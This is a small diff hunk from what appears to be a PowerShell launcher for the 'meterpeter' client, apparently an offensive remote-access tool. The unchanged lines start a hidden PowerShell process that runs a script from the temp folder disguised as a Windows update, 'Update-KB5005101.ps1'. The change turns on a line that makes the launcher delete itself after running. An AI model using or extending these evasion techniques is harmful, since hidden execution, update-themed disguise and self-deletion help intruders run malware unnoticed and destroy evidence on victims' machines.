@@ -53,5 +53,5 @@ write-host "[*] Executing meterpeter client .."
 Start-Process -WindowStyle Hidden powershell -ArgumentList "powershell -file '$Env:TMP\Update-KB5005101.ps1'"
 
 ## Auto-Delete cmdlet in the end ...
-#Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
+Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
 exit
